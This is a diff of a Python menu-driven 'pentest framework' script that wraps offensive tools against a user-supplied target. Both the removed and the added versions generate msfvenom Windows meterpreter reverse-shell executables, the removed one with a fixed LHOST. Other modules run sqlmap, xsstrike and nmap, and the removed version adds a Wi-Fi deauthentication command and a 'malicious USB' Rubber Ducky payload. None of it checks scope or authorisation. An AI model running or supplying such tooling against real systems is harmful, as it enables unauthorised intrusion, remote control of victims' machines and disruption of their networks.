@@ -1,163 +1,168 @@
 import os
+import sys
+import json
 import subprocess
 import requests
 import threading
-from urllib.parse import urlencode
-
-import os
-import subprocess
-import requests
-import threading
-from urllib.parse import urlencode
-from time import sleep
-
+from urllib.parse import urljoin, urlencode
+from bs4 import BeautifulSoup
 
 # Global Settings
-TARGET_URL = "http://example.com"  # Replace with the actual target
-HEADERS = {"User-Agent": "Mozilla/5.0"}
-SESSION = requests.Session()
+CONFIG_FILE = "settings.json"
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+}
 
+# Splash Screen
+def print_banner():
+    banner = """
+    ======================================
+            41PH4-01 Pentest Framework
+    ======================================
+    """
+    print(banner)
 
-# Utility: Install Required Dependencies
+# Load/Save Configuration
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'r') as file:
+            return json.load(file)
+    return {}
+
+def save_config(config):
+    with open(CONFIG_FILE, 'w') as file:
+        json.dump(config, file, indent=4)
+
+# Dependency Installation
 def install_dependencies():
-    print("\n[+] Installing Required Dependencies...")
-    dependencies = ["requests", "beautifulsoup4", "sublist3r", "shodan"]
-    for dep in dependencies:
-        subprocess.run(["pip3", "install", dep], check=True)
-    print("\n[+] Dependencies Installed Successfully.\n")
+    print("\nChecking and installing dependencies...\n")
+    dependencies = ["sqlmap", "xsstrike", "nmap"]
+    for tool in dependencies:
+        try:
+            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print(f"{tool} is already installed.")
+        except subprocess.CalledProcessError:
+            print(f"Installing {tool}...")
+            subprocess.run(["sudo", "apt-get", "install", "-y", tool])
 
+# Web Application Testing Modules
+def sql_injection_test(target_url):
+    print("[*] Testing for SQL Injection vulnerabilities...")
+    subprocess.run(["sqlmap", "-u", target_url, "--batch"])
 
-# Module 1: Advanced Recon
-def subdomain_enum():
-    print("\n[+] Starting Subdomain Enumeration...")
-    os.system(f"sublist3r -d {TARGET_URL}")
-    print("[+] Subdomain Enumeration Completed.\n")
+def xss_test(target_url):
+    print("[*] Testing for XSS vulnerabilities...")
+    subprocess.run(["xsstrike", "--url", target_url])
 
+def csrf_test(target_url):
+    print("[*] Testing for CSRF vulnerabilities...")
+    # Placeholder for CSRF testing logic
+    print("CSRF test completed. (To be expanded)")
 
-def social_media_scraping():
-    print("\n[+] Starting Social Media Recon...")
-    platforms = ["https://facebook.com/example", "https://twitter.com/example"]
-    for platform in platforms:
-        print(f"Scraping: {platform}")
-    print("[+] Social Media Recon Completed.\n")
+# Network Testing Modules
+def network_scan(ip_range):
+    print(f"[*] Scanning network: {ip_range}...")
+    subprocess.run(["nmap", "-A", ip_range])
 
+def arp_spoofing(target_ip, gateway_ip):
+    print("[*] Performing ARP Spoofing...")
+    # Placeholder for ARP spoofing logic
+    print("ARP Spoofing module under development.")
 
-# Module 2: Website Exploitation
-def sql_injection_test():
-    print("\n[+] Starting SQL Injection Test...")
-    sqlmap_path = "sqlmap"  # Ensure sqlmap is installed and in PATH
-    command = f"{sqlmap_path} -u {TARGET_URL} --batch --dbs"
-    os.system(command)
-    print("[+] SQL Injection Test Completed.\n")
+# Exploitation Modules
+def generate_payload(payload_type, lhost, lport):
+    print(f"[*] Generating {payload_type} payload...")
+    payload_file = f"{payload_type}_payload"
+    subprocess.run(["msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", payload_file])
+    print(f"Payload saved to {payload_file}")
 
+# Information Gathering Modules
+def scrape_website(target_url):
+    print("[*] Scraping website for information...")
+    response = requests.get(target_url, headers=HEADERS)
+    soup = BeautifulSoup(response.content, "html.parser")
+    print("[*] Website Title:", soup.title.string if soup.title else "None")
+    print("[*] Links Found:")
+    for link in soup.find_all("a"):
+        print(urljoin(target_url, link.get("href")))
 
-# Module 3: Payload Delivery
-def generate_reverse_shell():
-    print("\n[+] Generating Reverse Shell Payload...")
-    payload_command = (
-        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 "
-        "-f exe -o reverse_shell.exe"
-    )
-    os.system(payload_command)
-    print("[+] Reverse Shell Payload Saved as 'reverse_shell.exe'.\n")
-
-
-# Module 4: Network Attacks
-def wifi_deauth_attack():
-    print("\n[+] Starting Wi-Fi Deauthentication Attack...")
-    print("[!] Ensure You Have a Compatible Wi-Fi Adapter in Monitor Mode.")
-    deauth_command = "aireplay-ng --deauth 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0"
-    print(f"Execute: {deauth_command}")
-    print("[+] Wi-Fi Deauthentication Attack Simulated.\n")
-
-
-# Module 5: Malicious USB Payloads
-def create_malicious_usb():
-    print("\n[+] Creating Malicious USB Payload...")
-    rubber_ducky_payload = (
-        "REM Sample Rubber Ducky payload\nDELAY 1000\nSTRING cmd /c powershell"
-    )
-    with open("usb_payload.txt", "w") as file:
-        file.write(rubber_ducky_payload)
-    print("[+] USB Payload Saved as 'usb_payload.txt'.\n")
-
-
-# Module 6: Vulnerability Scanning
-def run_vulnerability_scan():
-    print("\n[+] Running Vulnerability Scanner...")
-    nmap_command = "nmap -sS -sV -p 1-1000 -T4 192.168.1.1"
-    os.system(nmap_command)
-    print("[+] Vulnerability Scan Completed.\n")
-
-
-# Module 7: Exploitation Framework Integration
-def metasploit_exploit():
-    print("\n[+] Launching Metasploit Exploitation Framework...")
-    msfconsole_command = "msfconsole"
-    os.system(msfconsole_command)
-    print("[+] Metasploit Session Completed.\n")
-
-
-# Module 8: Automated Recon
-def automated_recon():
-    print("\n[+] Initiating Automated Recon...")
-    print("Scanning for subdomains, running Nmap, and gathering Shodan data...\n")
-    subdomain_enum()
-    run_vulnerability_scan()
-    print("[+] Automated Recon Completed.\n")
-
-
-# Snazzy Menu
-def show_menu():
-    print("""
-    ==========================================
-      Advanced Penetration Testing Framework
-    ==========================================
-    [1] Install Dependencies
-    [2] Subdomain Enumeration
-    [3] Social Media Recon
-    [4] SQL Injection Test
-    [5] Generate Reverse Shell
-    [6] Wi-Fi Deauthentication Attack
-    [7] Create Malicious USB Payload
-    [8] Run Vulnerability Scanner
-    [9] Metasploit Exploitation Framework
-    [10] Automated Recon
-    [0] Exit
-    """)
-
-
-# Main Functionality
-def main():
+# Main Menu
+def main_menu():
     while True:
-        show_menu()
-        choice = input("Select an Option: ")
+        print("\n[1] Web Application Testing")
+        print("[2] Network Testing")
+        print("[3] Exploitation")
+        print("[4] Information Gathering")
+        print("[5] Install Dependencies")
+        print("[0] Exit")
+        choice = input("\nSelect an option: ")
+
         if choice == "1":
-            install_dependencies()
+            web_app_menu()
         elif choice == "2":
-            subdomain_enum()
+            network_menu()
         elif choice == "3":
-            social_media_scraping()
+            exploitation_menu()
         elif choice == "4":
-            sql_injection_test()
+            info_gathering_menu()
         elif choice == "5":
-            generate_reverse_shell()
-        elif choice == "6":
-            wifi_deauth_attack()
-        elif choice == "7":
-            create_malicious_usb()
-        elif choice == "8":
-            run_vulnerability_scan()
-        elif choice == "9":
-            metasploit_exploit()
-        elif choice == "10":
-            automated_recon()
+            install_dependencies()
         elif choice == "0":
             print("Exiting...")
-            break
+            sys.exit(0)
         else:
-            print("Invalid Choice. Try Again.")
+            print("Invalid choice. Please try again.")
 
+# Submenus
+def web_app_menu():
+    target_url = input("Enter target URL: ")
+    print("\n[1] SQL Injection")
+    print("[2] Cross-Site Scripting (XSS)")
+    print("[3] Cross-Site Request Forgery (CSRF)")
+    choice = input("\nSelect an option: ")
 
+    if choice == "1":
+        sql_injection_test(target_url)
+    elif choice == "2":
+        xss_test(target_url)
+    elif choice == "3":
+        csrf_test(target_url)
+    else:
+        print("Invalid choice.")
+
+def network_menu():
+    print("\n[1] Network Scan")
+    print("[2] ARP Spoofing")
+    choice = input("\nSelect an option: ")
+
+    if choice == "1":
+        ip_range = input("Enter IP range (e.g., 192.168.1.0/24): ")
+        network_scan(ip_range)
+    elif choice == "2":
+        target_ip = input("Enter target IP: ")
+        gateway_ip = input("Enter gateway IP: ")
+        arp_spoofing(target_ip, gateway_ip)
+    else:
+        print("Invalid choice.")
+
+def exploitation_menu():
+    print("\n[1] Generate Reverse Shell Payload")
+    choice = input("\nSelect an option: ")
+
+    if choice == "1":
+        payload_type = input("Enter payload type (e.g., windows/meterpreter/reverse_tcp): ")
+        lhost = input("Enter LHOST: ")
+        lport = input("Enter LPORT: ")
+        generate_payload(payload_type, lhost, lport)
+    else:
+        print("Invalid choice.")
+
+def info_gathering_menu():
+    target_url = input("Enter target URL: ")
+    scrape_website(target_url)
+
+# Entry Point
 if __name__ == "__main__":
-    main()
+    print_banner()
+    config = load_config()
+    main_menu()
